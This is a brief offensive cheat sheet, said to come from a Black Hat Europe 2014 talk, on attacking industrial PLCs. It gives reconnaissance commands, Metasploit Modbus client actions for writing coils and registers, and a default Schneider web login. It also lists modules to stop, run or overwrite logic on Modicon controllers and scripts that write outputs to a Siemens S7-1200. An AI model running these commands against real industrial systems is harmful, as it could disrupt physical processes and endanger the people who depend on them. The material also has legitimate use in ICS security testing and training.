## Taken from Arnaud Souilles' presentation at Blackhat Europe 2014

### Reconaissance
* python plcscan #ipaddress
* Ports 102 (Siemens) and 502 (Modbus)
* snmpcheck -t #ipaddress


### Action

#### Modbus

```console
   msf > use auxiliary/scanner/scada/modbusclient
   
   show actions
   Name                    Description
   ----                    -----------
   READ_COILS              Read bits from several coils
   READ_DISCRETE_INPUTS    Read bits from several DISCRETE INPUTS
   READ_HOLDING_REGISTERS  Read words from several HOLDING registers
   READ_INPUT_REGISTERS    Read words from several INPUT registers
   WRITE_COIL              Write one bit to a coil
   WRITE_COILS             Write bits to several coils
   WRITE_REGISTER          Write one word to a register
   WRITE_REGISTERS         Write words to several registers

   show options
   
   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA                             no        Data to write (WRITE_COIL and WRITE_REGISTER modes only)
   DATA_ADDRESS                     yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g. 0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comma (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_DISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS modes only)
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number

```

* Schneider Web default credentials user/user
* Check FTP default credentials
* decompile firmware and check for strings
* Scan registry values with **mbtget**
* metasploit
  * metasploit/auxiliary/admin/scada modicon_stux_transfer_ASO // STOP or RUN
  * metasploit/auxiliary/admin/scada modicon_command // Logic download or upload
* Siemens S7-1200
  * python s7-read-new.py 192.168.0.50
  * python s7-write-outputs.py 192.168.0.50 11111
